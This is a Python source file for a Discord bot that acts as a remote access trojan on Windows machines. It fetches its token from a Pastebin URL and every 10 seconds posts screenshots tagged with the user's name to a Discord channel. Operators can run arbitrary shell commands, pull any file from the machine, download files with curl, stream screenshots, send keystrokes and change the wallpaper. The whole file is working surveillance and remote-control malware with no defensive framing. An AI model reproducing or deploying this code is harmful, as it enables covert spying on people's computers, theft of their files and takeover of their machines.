import ctypes
import discord
from discord.ext import commands, tasks
import os
from asyncio import sleep
import time
from requests import get
import pyautogui as pg
from commands import Command
import ctypes

PASTEBIN_URL = ""

print("Awaiting internet connection...")
while True:
    try:
        r = get("https://www.google.com")
        print("responded")
        time.sleep(10)
        break
    except Exception:
        continue

usage = {
    "stream": "!stream [number of screenshots] [delay between screenshots]",
    "combo": "!combo [stream of characters and keystrokes you would like to type]\n[Here is a list of allowed keystrokes](https://pyautogui.readthedocs.io/en/latest/keyboard.html#keyboard-keys)"    
}
terminalHistory = []

ss_channel_id=000000000000 #channel where screen grabs get posted routinely
username = os.popen("echo %USERNAME%").read().removesuffix("\n")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
channel = bot.get_channel(ss_channel_id)
command = Command()


@tasks.loop(seconds=10)
async def background():
    await bot.wait_until_ready()
    try:
        r = get("https://www.google.com")
    except Exception:
        return
    channel = bot.get_channel(ss_channel_id)
    if isinstance(channel, discord.channel.TextChannel):
        try:
            pg.screenshot('sshot.png')
        except Exception as e:
            await channel.send(f"{e}")
            return
        title = f"[{username}] {time.ctime()}"
        await channel.send("\n"+title, file=discord.File('sshot.png'))
        os.remove('sshot.png')

@bot.event
async def on_ready():
    background.start()

@bot.event
async def on_message(message):
    if (message.author == bot.user):
        return
    content = message.content.lower()
    if content.startswith("/"):
        try:
            for c in content.removeprefix("/").split("|"):
                command.executeCommand(c.strip())
            await message.reply("Command executed")
        except Exception as e:
            msg = "Error:\n"+str(e)
            await message.reply(msg)
    
    await bot.process_commands(message)

@bot.command()
async def ss(context):
    try:
        pg.screenshot('ss.png')
    except OSError:
        await context.reply("Screen grab failed! The display might be turned off")
        return
    title = f"[{username}] {time.ctime()}"
    await context.send(title, file=discord.File('ss.png'))
    os.remove('ss.png')

@bot.command()
async def stream(context):
    print(context.channel)
    content = str(context.message.content).removeprefix("!stream").strip()
    l = []
    for x in content.split(" "):
        try:
            if int(x) < 1:
                continue
            l.append(int(x))
        except:
            continue
    if len(l) == 0:
        l = [200, 3]
        msg = "Using default values\n200 screenshots at 3 seconds delay"
        await context.send(msg)
    if l[0] > 2000:
        await context.send("MAx 2000 screenshots allowed")
        return
    l.append(3)
    print("Number of screenshots:",l[0])
    print("Delay:", l[1]-1)
    for i in range(0, l[0]):
        try:
            pg.screenshot('sstream.png')
        except OSError:
            await context.reply("Screen grab failed! The display might be turned off")
            return
        title = f"[{i+1}/{l[0]}][{username}] {time.ctime()}"
        await context.send(title, file=discord.File('sstream.png'))
        os.remove('sstream.png')
        await sleep(l[1]-1)

@bot.command()
async def cmd(context):
    content = str(context.message.content).removeprefix("!cmd").strip()
    if content == "clear":
        terminalHistory.clear()
        await context.reply("Terminal cleared")
        return
    if content == "clearlast":
        c = terminalHistory.pop()
        await context.reply(f"Command cleared\n `{c}`")
        return
    consoleHistory = ""
    for c in  terminalHistory:
        consoleHistory += c+" && echo .......... && "
    res = os.popen(f"{consoleHistory}{content}")
    s = res.read().split("..........")[-1][0:2000]
    if res.close() is not None:
        await context.reply("Inavlid command")
        return
    output = f"```\n{s}\n```"
    await context.reply(output)
    terminalHistory.append(content)

@bot.command()
async def getfile(context):
    filePath = str(context.message.content).removeprefix("!getfile").strip()
    if os.path.isfile(filePath):
        await context.reply(file=discord.File(filePath))
    else:
        await context.reply("File not found!")

@bot.command()
async def download(context):
    url = str(context.message.content).removeprefix("!download").strip()
    res = os.popen(f"curl {url} && dir")
    out = res.read()
    if res.close() is not None:
        await context.reply("Error")
        return
    await context.reply("File downloaded!")

@bot.command()
async def setwallpaper(context):
    filename = str(context.message.content).removeprefix("!setwallpaper").strip()
    if filename not in os.listdir():
        await context.reply("File not found!")
        return
    path = os.getcwd()+'\\'+filename
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await context.reply("Wallpaper changed!")
    except Exception as e:
        await context.reply(f"Error:\n{e}")
        return

def getToken() -> str:
    try:
        return str(get(PASTEBIN_URL).text)
    except Exception:
        time.sleep(3)
        return getToken()

token = getToken()
bot.run(token)